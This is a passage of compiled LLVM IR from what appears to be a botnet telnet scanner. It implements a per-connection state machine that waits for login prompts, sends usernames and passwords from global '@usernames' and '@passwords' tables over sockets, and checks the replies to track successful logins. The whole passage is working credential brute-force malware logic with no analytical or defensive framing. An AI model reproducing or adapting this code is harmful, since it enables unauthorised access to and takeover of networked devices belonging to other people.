  %494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %493, i32 0, i32 2
  store i8 3, i8* %494, align 8
  br label %1086

495:                                              ; preds = %458
  %496 = load i32, i32* %2, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %497
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 16
  %501 = load i32, i32* %2, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 8
  %505 = load i8*, i8** %504, align 8
  %506 = load i32, i32* %2, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 7
  %510 = load i16, i16* %509, align 16
  %511 = zext i16 %510 to i32
  %512 = call i32 @readUntil(i32 noundef %500, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i64 0, i64 0), i32 noundef 0, i32 noundef 0, i32 noundef 10000, i8* noundef %505, i32 noundef 1024, i32 noundef %511)
  %513 = icmp ne i32 %512, 0
  br i1 %513, label %514, label %532

514:                                              ; preds = %495
  %515 = load i32, i32* %2, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %516
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %517, i32 0, i32 6
  store i32 0, i32* %518, align 4
  %519 = load i32, i32* %2, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 7
  store i16 0, i16* %522, align 16
  %523 = load i32, i32* %2, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 8
  %527 = load i8*, i8** %526, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %527, i8 0, i64 1024, i1 false)
  %528 = load i32, i32* %2, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 2
  store i8 5, i8* %531, align 8
  br label %1086

532:                                              ; preds = %495
  %533 = load i32, i32* %2, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %534
  %536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %535, i32 0, i32 8
  %537 = load i8*, i8** %536, align 8
  %538 = call i64 @strlen(i8* noundef %537) #11
  %539 = trunc i64 %538 to i16
  %540 = load i32, i32* %2, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %541
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %542, i32 0, i32 7
  store i16 %539, i16* %543, align 16
  br label %544

544:                                              ; preds = %532
  br label %545

545:                                              ; preds = %544
  br label %546

546:                                              ; preds = %545
  %547 = load i32, i32* %2, align 4
  %548 = sext i32 %547 to i64
  %549 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %548
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %549, i32 0, i32 6
  %551 = load i32, i32* %550, align 4
  %552 = add i32 %551, 20
  %553 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %554 = icmp ult i32 %552, %553
  br i1 %554, label %555, label %570

555:                                              ; preds = %546
  %556 = load i32, i32* %2, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %557
  %559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %558, i32 0, i32 0
  %560 = load i32, i32* %559, align 16
  %561 = call i32 @sclose(i32 noundef %560)
  %562 = load i32, i32* %2, align 4
  %563 = sext i32 %562 to i64
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %563
  %565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %564, i32 0, i32 2
  store i8 0, i8* %565, align 8
  %566 = load i32, i32* %2, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %567
  %569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %568, i32 0, i32 3
  store i8 1, i8* %569, align 1
  br label %570

570:                                              ; preds = %555, %546
  br label %1085

571:                                              ; preds = %69
  %572 = load i32, i32* %2, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %573
  %575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %574, i32 0, i32 0
  %576 = load i32, i32* %575, align 16
  %577 = load i32, i32* %2, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %578
  %580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %579, i32 0, i32 4
  %581 = load i8, i8* %580, align 2
  %582 = zext i8 %581 to i64
  %583 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %582
  %584 = load i8*, i8** %583, align 8
  %585 = load i32, i32* %2, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 4
  %589 = load i8, i8* %588, align 2
  %590 = zext i8 %589 to i64
  %591 = getelementptr inbounds [6 x i8*], [6 x i8*]* @usernames, i64 0, i64 %590
  %592 = load i8*, i8** %591, align 8
  %593 = call i64 @strlen(i8* noundef %592) #11
  %594 = call i64 @send(i32 noundef %576, i8* noundef %584, i64 noundef %593, i32 noundef 16384)
  %595 = icmp slt i64 %594, 0
  br i1 %595, label %596, label %611

596:                                              ; preds = %571
  %597 = load i32, i32* %2, align 4
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %598
  %600 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 16
  %602 = call i32 @sclose(i32 noundef %601)
  %603 = load i32, i32* %2, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %604
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %605, i32 0, i32 2
  store i8 0, i8* %606, align 8
  %607 = load i32, i32* %2, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %608
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %609, i32 0, i32 3
  store i8 1, i8* %610, align 1
  br label %1086

611:                                              ; preds = %571
  %612 = load i32, i32* %2, align 4
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %613
  %615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %614, i32 0, i32 0
  %616 = load i32, i32* %615, align 16
  %617 = call i64 @send(i32 noundef %616, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %618 = icmp slt i64 %617, 0
  br i1 %618, label %619, label %634

619:                                              ; preds = %611
  %620 = load i32, i32* %2, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %621
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %622, i32 0, i32 0
  %624 = load i32, i32* %623, align 16
  %625 = call i32 @sclose(i32 noundef %624)
  %626 = load i32, i32* %2, align 4
  %627 = sext i32 %626 to i64
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %627
  %629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %628, i32 0, i32 2
  store i8 0, i8* %629, align 8
  %630 = load i32, i32* %2, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %631
  %633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %632, i32 0, i32 3
  store i8 1, i8* %633, align 1
  br label %1086

634:                                              ; preds = %611
  %635 = load i32, i32* %2, align 4
  %636 = sext i32 %635 to i64
  %637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %636
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %637, i32 0, i32 2
  store i8 4, i8* %638, align 8
  br label %1085

639:                                              ; preds = %69
  %640 = load i32, i32* %2, align 4
  %641 = sext i32 %640 to i64
  %642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %641
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %642, i32 0, i32 6
  %644 = load i32, i32* %643, align 4
  %645 = icmp eq i32 %644, 0
  br i1 %645, label %646, label %652

646:                                              ; preds = %639
  %647 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %648 = load i32, i32* %2, align 4
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %649
  %651 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %650, i32 0, i32 6
  store i32 %647, i32* %651, align 4
  br label %652

652:                                              ; preds = %646, %639
  %653 = load i32, i32* %2, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 8
  %657 = load i8*, i8** %656, align 8
  %658 = call i32 @matchPrompt(i8* noundef %657)
  %659 = icmp ne i32 %658, 0
  br i1 %659, label %660, label %665

660:                                              ; preds = %652
  %661 = load i32, i32* %2, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %662
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %663, i32 0, i32 2
  store i8 7, i8* %664, align 8
  br label %665

665:                                              ; preds = %660, %652
  %666 = load i32, i32* %2, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 0
  %670 = load i32, i32* %669, align 16
  %671 = load i32, i32* %2, align 4
  %672 = sext i32 %671 to i64
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %672
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %673, i32 0, i32 8
  %675 = load i8*, i8** %674, align 8
  %676 = load i32, i32* %2, align 4
  %677 = sext i32 %676 to i64
  %678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %677
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %678, i32 0, i32 7
  %680 = load i16, i16* %679, align 16
  %681 = zext i16 %680 to i32
  %682 = call i32 @readUntil(i32 noundef %670, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %675, i32 noundef 1024, i32 noundef %681)
  %683 = icmp ne i32 %682, 0
  br i1 %683, label %684, label %716

684:                                              ; preds = %665
  %685 = load i32, i32* %2, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 6
  store i32 0, i32* %688, align 4
  %689 = load i32, i32* %2, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %690
  %692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %691, i32 0, i32 7
  store i16 0, i16* %692, align 16
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 8
  %697 = load i8*, i8** %696, align 8
  %698 = call i8* @strstr(i8* noundef %697, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i64 0, i64 0)) #11
  %699 = icmp ne i8* %698, null
  br i1 %699, label %700, label %705

700:                                              ; preds = %684
  %701 = load i32, i32* %2, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 2
  store i8 5, i8* %704, align 8
  br label %710

705:                                              ; preds = %684
  %706 = load i32, i32* %2, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 2
  store i8 7, i8* %709, align 8
  br label %710

710:                                              ; preds = %705, %700
  %711 = load i32, i32* %2, align 4
  %712 = sext i32 %711 to i64
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %712
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %713, i32 0, i32 8
  %715 = load i8*, i8** %714, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %715, i8 0, i64 1024, i1 false)
  br label %1086

716:                                              ; preds = %665
  %717 = load i32, i32* %2, align 4
  %718 = sext i32 %717 to i64
  %719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %718
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %719, i32 0, i32 8
  %721 = load i8*, i8** %720, align 8
  %722 = call i8* @strstr(i8* noundef %721, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i64 0, i64 0)) #11
  %723 = icmp ne i8* %722, null
  br i1 %723, label %724, label %739

724:                                              ; preds = %716
  %725 = load i32, i32* %2, align 4
  %726 = sext i32 %725 to i64
  %727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %726
  %728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %727, i32 0, i32 0
  %729 = load i32, i32* %728, align 16
  %730 = call i32 @sclose(i32 noundef %729)
  %731 = load i32, i32* %2, align 4
  %732 = sext i32 %731 to i64
  %733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %732
  %734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %733, i32 0, i32 2
  store i8 0, i8* %734, align 8
  %735 = load i32, i32* %2, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %736
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %737, i32 0, i32 3
  store i8 0, i8* %738, align 1
  br label %1086

739:                                              ; preds = %716
  %740 = load i32, i32* %2, align 4
  %741 = sext i32 %740 to i64
  %742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %741
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %742, i32 0, i32 8
  %744 = load i8*, i8** %743, align 8
  %745 = call i64 @strlen(i8* noundef %744) #11
  %746 = trunc i64 %745 to i16
  %747 = load i32, i32* %2, align 4
  %748 = sext i32 %747 to i64
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %748
  %750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %749, i32 0, i32 7
  store i16 %746, i16* %750, align 16
  br label %751

751:                                              ; preds = %739
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 6
  %756 = load i32, i32* %755, align 4
  %757 = add i32 %756, 8
  %758 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %759 = icmp ult i32 %757, %758
  br i1 %759, label %760, label %775

760:                                              ; preds = %751
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 0
  %765 = load i32, i32* %764, align 16
  %766 = call i32 @sclose(i32 noundef %765)
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 2
  store i8 0, i8* %770, align 8
  %771 = load i32, i32* %2, align 4
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 3
  store i8 1, i8* %774, align 1
  br label %775

775:                                              ; preds = %760, %751
  br label %1085

776:                                              ; preds = %69
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 0
  %781 = load i32, i32* %780, align 16
  %782 = load i32, i32* %2, align 4
  %783 = sext i32 %782 to i64
  %784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %783
  %785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %784, i32 0, i32 5
  %786 = load i8, i8* %785, align 1
  %787 = zext i8 %786 to i64
  %788 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %787
  %789 = load i8*, i8** %788, align 8
  %790 = load i32, i32* %2, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 5
  %794 = load i8, i8* %793, align 1
  %795 = zext i8 %794 to i64
  %796 = getelementptr inbounds [14 x i8*], [14 x i8*]* @passwords, i64 0, i64 %795
  %797 = load i8*, i8** %796, align 8
  %798 = call i64 @strlen(i8* noundef %797) #11
  %799 = call i64 @send(i32 noundef %781, i8* noundef %789, i64 noundef %798, i32 noundef 16384)
  %800 = icmp slt i64 %799, 0
  br i1 %800, label %801, label %816

801:                                              ; preds = %776
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 0
  %806 = load i32, i32* %805, align 16
  %807 = call i32 @sclose(i32 noundef %806)
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 2
  store i8 0, i8* %811, align 8
  %812 = load i32, i32* %2, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %813
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %814, i32 0, i32 3
  store i8 1, i8* %815, align 1
  br label %1086

816:                                              ; preds = %776
  %817 = load i32, i32* %2, align 4
  %818 = sext i32 %817 to i64
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %818
  %820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %819, i32 0, i32 0
  %821 = load i32, i32* %820, align 16
  %822 = call i64 @send(i32 noundef %821, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %823 = icmp slt i64 %822, 0
  br i1 %823, label %824, label %839

824:                                              ; preds = %816
  %825 = load i32, i32* %2, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 0
  %829 = load i32, i32* %828, align 16
  %830 = call i32 @sclose(i32 noundef %829)
  %831 = load i32, i32* %2, align 4
  %832 = sext i32 %831 to i64
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %832
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %833, i32 0, i32 2
  store i8 0, i8* %834, align 8
  %835 = load i32, i32* %2, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %836
  %838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %837, i32 0, i32 3
  store i8 1, i8* %838, align 1
  br label %1086

839:                                              ; preds = %816
  %840 = load i32, i32* %2, align 4
  %841 = sext i32 %840 to i64
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %841
  %843 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %842, i32 0, i32 2
  store i8 6, i8* %843, align 8
  br label %1085

844:                                              ; preds = %69
  %845 = load i32, i32* %2, align 4
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %846
  %848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %847, i32 0, i32 6
  %849 = load i32, i32* %848, align 4
  %850 = icmp eq i32 %849, 0
  br i1 %850, label %851, label %857

851:                                              ; preds = %844
  %852 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %853 = load i32, i32* %2, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 6
  store i32 %852, i32* %856, align 4
  br label %857

857:                                              ; preds = %851, %844
  %858 = load i32, i32* %2, align 4
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %859
  %861 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %860, i32 0, i32 0
  %862 = load i32, i32* %861, align 16
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 8
  %867 = load i8*, i8** %866, align 8
  %868 = load i32, i32* %2, align 4
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %869
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %870, i32 0, i32 7
  %872 = load i16, i16* %871, align 16
  %873 = zext i16 %872 to i32
  %874 = call i32 @readUntil(i32 noundef %862, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %867, i32 noundef 1024, i32 noundef %873)
  %875 = icmp ne i32 %874, 0
  br i1 %875, label %876, label %951

876:                                              ; preds = %857
  %877 = load i32, i32* %2, align 4
  %878 = sext i32 %877 to i64
  %879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %878
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %879, i32 0, i32 6
  store i32 0, i32* %880, align 4
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 7
  store i16 0, i16* %884, align 16
  %885 = load i32, i32* %2, align 4
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %886
  %888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %887, i32 0, i32 8
  %889 = load i8*, i8** %888, align 8
  %890 = call i8* @strstr(i8* noundef %889, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.52, i64 0, i64 0)) #11
  %891 = icmp ne i8* %890, null
  br i1 %891, label %892, label %912

892:                                              ; preds = %876
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 8
  %897 = load i8*, i8** %896, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %897, i8 0, i64 1024, i1 false)
  %898 = load i32, i32* %2, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 0
  %902 = load i32, i32* %901, align 16
  %903 = call i32 @sclose(i32 noundef %902)
  %904 = load i32, i32* %2, align 4
  %905 = sext i32 %904 to i64
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %905
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %906, i32 0, i32 2
  store i8 0, i8* %907, align 8
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 3
  store i8 0, i8* %911, align 1
  br label %1086

912:                                              ; preds = %876
  %913 = load i32, i32* %2, align 4
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %914
  %916 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %915, i32 0, i32 8
  %917 = load i8*, i8** %916, align 8
  %918 = call i32 @matchPrompt(i8* noundef %917)
  %919 = icmp ne i32 %918, 0
  br i1 %919, label %940, label %920

920:                                              ; preds = %912
  %921 = load i32, i32* %2, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 8
  %925 = load i8*, i8** %924, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %925, i8 0, i64 1024, i1 false)
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 0
  %930 = load i32, i32* %929, align 16
  %931 = call i32 @sclose(i32 noundef %930)
  %932 = load i32, i32* %2, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 2
  store i8 0, i8* %935, align 8
  %936 = load i32, i32* %2, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 3
  store i8 1, i8* %939, align 1
  br label %1086

940:                                              ; preds = %912
  %941 = load i32, i32* %2, align 4
  %942 = sext i32 %941 to i64
  %943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %942
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %943, i32 0, i32 2
  store i8 7, i8* %944, align 8
  br label %945

945:                                              ; preds = %940
  %946 = load i32, i32* %2, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %947
  %949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %948, i32 0, i32 8
  %950 = load i8*, i8** %949, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %950, i8 0, i64 1024, i1 false)
  br label %1086

951:                                              ; preds = %857
  %952 = load i32, i32* %2, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %953
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %954, i32 0, i32 8
  %956 = load i8*, i8** %955, align 8
  %957 = call i64 @strlen(i8* noundef %956) #11
  %958 = trunc i64 %957 to i16
  %959 = load i32, i32* %2, align 4
  %960 = sext i32 %959 to i64
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 7
  store i16 %958, i16* %962, align 16
  br label %963

